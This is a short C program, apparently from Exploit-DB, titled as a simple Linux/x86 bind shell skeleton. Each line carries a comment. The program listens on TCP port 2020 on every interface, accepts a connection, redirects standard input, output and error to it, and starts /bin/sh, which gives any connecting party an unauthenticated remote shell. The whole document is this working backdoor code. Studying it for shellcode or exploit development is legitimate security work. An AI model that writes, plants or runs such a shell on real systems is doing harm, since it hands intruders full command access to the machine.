/*
 Title: Linux/x86 Bind Shell code - simple C skeleton
 Author: Zsolt Agoston (agzsolt)
 Website: http://x86net.com
 Source: https://www.exploit-db.com/exploits/40056
*/

#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main(void)
{

int sock_file_des, clientfd;

struct sockaddr_in saddr;
saddr.sin_family = AF_INET;						// socket type
saddr.sin_port = htons(2020);						// listening port tcp/2020
saddr.sin_addr.s_addr = INADDR_ANY;					// bindshell will be listening on any address

sock_file_des = socket(AF_INET, SOCK_STREAM, 0);			// create tcp socket (SOCK_STREAM for tcp, SOCK_DGRAM for udp, etc)

bind(sock_file_des, (struct sockaddr *) &saddr, sizeof(saddr));		// bind socket (bind the predefined address to the fresh socket)

listen(sock_file_des, 0);						// listening for new connection

clientfd = accept(sock_file_des, NULL, NULL);				// accept incoming connections

dup2(clientfd, 0);							// redirect stdin
dup2(clientfd, 1);							// redirect stdout
dup2(clientfd, 2);							// redirect stderr

execve("/bin/sh",NULL,NULL);						// execute /bin/sh

}
